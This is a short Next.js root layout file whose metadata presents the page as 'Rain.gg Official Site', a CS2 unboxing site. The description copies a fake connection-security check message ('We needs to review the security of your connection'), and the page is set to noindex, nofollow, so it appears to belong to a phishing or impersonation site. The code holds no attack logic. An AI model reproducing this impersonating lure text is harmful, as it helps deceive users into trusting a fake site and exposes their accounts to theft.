import './globals.css'
import { Inter } from 'next/font/google'

const inter = Inter({ subsets: ['latin'] })

export const metadata = {
  title: 'Rain.gg: The Fastest Growing CS2 (CS:GO) Unboxing Site',
  description: 'Rain.gg Official Site. We needs to review the security of your connection before proceeding',
  robots: 'noindex, nofollow',
}

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body className={inter.className}>{children}</body>
    </html>
  )
}